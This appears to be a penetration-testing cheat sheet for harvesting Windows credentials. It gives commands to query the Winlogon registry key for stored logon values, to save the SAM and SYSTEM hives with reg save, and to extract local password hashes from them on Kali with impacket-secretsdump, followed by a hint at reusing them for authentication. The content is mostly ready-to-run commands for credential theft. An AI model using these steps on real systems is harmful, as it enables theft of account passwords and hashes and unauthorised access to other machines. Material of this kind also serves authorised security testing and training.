## Inspect local Winlogon configuration

**Run in:** Windows cmd.exe. **Requires:** Read access to the selected registry key and awareness of the host/registry view being queried.

```console
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**What the result establishes:** Identify the hive/key and distinguish query, export, save and modification operations.

**Next check:** Record the key and actual values; verify account scope and current validity before attempting authentication.

## Export local account hives

**Elevated Windows cmd.exe or PowerShell**

```text
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

C:\Temp must exist; save both hives from the same host.

## Read transferred hives

**Kali**

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Transfer both files to Kali first.

## If it fails

| Symptom | Check |
| --- | --- |
| Values are absent or refer to an old account | Reading configuration differs from saving protected hives; elevation and registry view can change what is accessible. |
